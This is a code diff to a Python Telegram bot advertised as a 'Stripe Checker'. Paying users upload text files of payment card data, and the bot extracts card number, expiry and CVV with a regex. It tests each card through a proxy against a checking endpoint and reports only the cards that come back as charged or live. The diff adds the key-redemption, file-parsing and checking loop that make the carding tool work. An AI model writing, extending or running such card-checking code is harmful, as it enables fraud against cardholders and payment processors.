@@ -86,14 +86,14 @@ async def check_card(card: str):
         async with aiohttp.ClientSession() as session:
             async with session.get(url, proxy=proxy_url, timeout=40) as r:
                 text = await r.text()
-                print(f"[{current_time}] STATUS: {r.status} | RESPONSE: {text[:400]}")
+                print(f"[{current_time}] STATUS: {r.status} | RESPONSE: {text}")
 
                 if r.status == 200 and any(x in text.lower() for x in ["approved", "success", "live", "charged"]):
                     print(f"[{current_time}] ✅ LIVE HIT!")
                     return {"status": "Approved", "response": "Charged $1"}
                 else:
                     print(f"[{current_time}] ❌ DECLINED (Silent)")
-                    return {"status": "Declined", "response": "Declined"}  # Silent for user
+                    return {"status": "Declined", "response": "Declined"}
 
     except Exception as e:
         print(f"[{current_time}] ERROR: {e}")
@@ -115,7 +115,7 @@ async def send_approved(event, card):
 async def start(event):
     if not await is_premium(event.sender_id):
         return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY`")
-    await event.reply("**🔥 Stripe Checker**\nSend `.txt` file (Only Charged Cards will show)")
+    await event.reply("**🔥 Stripe Checker**\nSend `.txt` file (Only Charged Cards)")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
 async def genkey(event):
@@ -123,4 +123,54 @@ async def genkey(event):
         return await event.reply("Owner only!")
     days = int(event.pattern_match.group(1) or 30)
     key = await generate_key(days)
-    await event.reply(f"✅ New Key:\n`{key}`
+    await event.reply(f"✅ New Key:\n`{key}`")
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]key(?:\s+(.+))?$'))
+async def redeem(event):
+    key = event.pattern_match.group(1)
+    if not key:
+        return await event.reply("Usage: `/key YOURKEY`")
+    msg = await redeem_key(event.sender_id, key)
+    await event.reply(msg)
+
+@client.on(events.NewMessage())
+async def txt_handler(event):
+    if not event.document or not str(event.file.name).lower().endswith('.txt'):
+        return
+    if not await is_premium(event.sender_id):
+        return await event.reply("❌ No Access!")
+
+    await event.reply("📂 Processing TXT file...")
+    path = f"temp_{event.sender_id}.txt"
+    await event.download_media(path)
+
+    cards = []
+    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
+        content = await f.read()
+        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
+        for c in found:
+            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
+            if len(cleaned.split('|')) == 4:
+                cards.append(cleaned)
+
+    os.remove(path)
+
+    if not cards:
+        return await event.reply("❌ No valid cards!")
+
+    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check... (Only Charged)")
+
+    for card in cards:
+        result = await check_card(card)
+        if result["status"] == "Approved":
+            await send_approved(event, card)
+        # Dead cards silent
+        await asyncio.sleep(5)
+
+async def main():
+    print("🚀 Bot Started - Only Charged Cards Shown")
+    await client.start(bot_token=BOT_TOKEN)
+    await client.run_until_disconnected()
+
+if __name__ == "__main__":
+    asyncio.run(main())
